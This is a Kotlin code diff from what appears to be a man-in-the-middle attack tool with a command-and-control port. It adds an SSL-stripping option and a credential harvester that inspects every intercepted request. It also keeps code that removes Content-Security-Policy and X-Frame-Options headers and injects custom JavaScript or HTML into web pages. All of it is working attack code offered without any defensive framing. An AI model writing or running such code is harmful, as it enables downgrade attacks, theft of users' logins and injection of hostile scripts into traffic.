@@ -12,7 +12,8 @@ data class InjectionConfig(
     var customJs: String? = null,
     var customHtml: String? = null,
     var imageSwapMap: Map<String, String> = emptyMap(),
-    var headerOverrides: Map<String, String> = emptyMap()
+    var headerOverrides: Map<String, String> = emptyMap(),
+    var sslStripEnabled: Boolean = false
 )
 
 class ContentInjector(
@@ -21,19 +22,35 @@ class ContentInjector(
     private val c2Port: Int = 9091
 ) {
     var config = InjectionConfig()
+    val sslStrip = SslStrip()
+    val harvester = CredentialHarvester()
+
+    fun inspectRequest(packet: InterceptedPacket) {
+        // harvest credentials from every request
+        harvester.inspect(packet)
+    }
 
     fun inject(packet: InterceptedPacket): InterceptedPacket {
         try {
-            val contentType = packet.headers["Content-Type"] ?: packet.headers["content-type"] ?: ""
-            if (!contentType.contains("text/html", ignoreCase = true)) return maybeSwapImage(packet)
-            config.headerOverrides.forEach { (k, v) -> packet.headers[k] = v }
-            listOf("Content-Security-Policy", "content-security-policy", "X-Content-Type-Options",
-                "x-content-type-options", "X-Frame-Options", "x-frame-options").forEach { packet.headers.remove(it) }
-            var html = String(packet.body, StandardCharsets.UTF_8)
+            // run SSLStrip on responses
+            var result = if (config.sslStripEnabled) {
+                sslStrip.enabled = true
+                sslStrip.stripResponse(packet)
+            } else { sslStrip.enabled = false; packet }
+
+            val contentType = result.headers["Content-Type"] ?: result.headers["content-type"] ?: ""
+            if (!contentType.contains("text/html", ignoreCase = true)) return maybeSwapImage(result)
+
+            config.headerOverrides.forEach { (k, v) -> result.headers[k] = v }
+            listOf("Content-Security-Policy", "content-security-policy",
+                "X-Content-Type-Options", "x-content-type-options",
+                "X-Frame-Options", "x-frame-options").forEach { result.headers.remove(it) }
+
+            var html = String(result.body, StandardCharsets.UTF_8)
             val payload = buildPayload()
             if (payload.isNotEmpty()) html = injectBeforeClose(html, payload)
-            packet.body = html.toByteArray(StandardCharsets.UTF_8)
-            packet.headers["Content-Length"] = packet.body.size.toString()
+            result.body = html.toByteArray(StandardCharsets.UTF_8)
+            result.headers["Content-Length"] = result.body.size.toString()
         } catch (e: Exception) {
             Log.e("CG2", "Injection failed", e)
         }
